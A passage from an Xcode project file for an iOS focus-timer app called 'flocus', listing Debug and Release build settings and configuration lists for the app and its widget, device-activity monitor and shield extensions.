				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = HK5U3FU2AP;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		C8EA76C82F83B15100929742 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = HK5U3FU2AP;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		C8EA76CA2F83B15100929742 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = flocus/flocus.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = flocus/Info.plist;
				INFOPLIST_KEY_NSSupportsLiveActivities = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		C8EA76CB2F83B15100929742 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = flocus/flocusRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = flocus/Info.plist;
				INFOPLIST_KEY_NSSupportsLiveActivities = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		C86FBC832F84161C002FCEEF /* Build configuration list for PBXNativeTarget "TimerWidgetExtension" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C86FBC842F84161C002FCEEF /* Debug */,
				C86FBC852F84161C002FCEEF /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		C8B167692F86575700D8D9C3 /* Build configuration list for PBXNativeTarget "DeviceActivityMonitorExtension" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C8B1676A2F86575700D8D9C3 /* Debug */,
				C8B1676B2F86575700D8D9C3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		C8B1677E2F8657C900D8D9C3 /* Build configuration list for PBXNativeTarget "ShieldConfiguration" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C8B1677F2F8657C900D8D9C3 /* Debug */,
				C8B167802F8657C900D8D9C3 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		C8EA76B92F83B15000929742 /* Build configuration list for PBXProject "flocus" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C8EA76C72F83B15100929742 /* Debug */,
				C8EA76C82F83B15100929742 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		C8EA76C92F83B15100929742 /* Build configuration list for PBXNativeTarget "flocus" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C8EA76CA2F83B15100929742 /* Debug */,
				C8EA76CB2F83B15100929742 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = C8EA76B62F83B15000929742 /* Project object */;
}
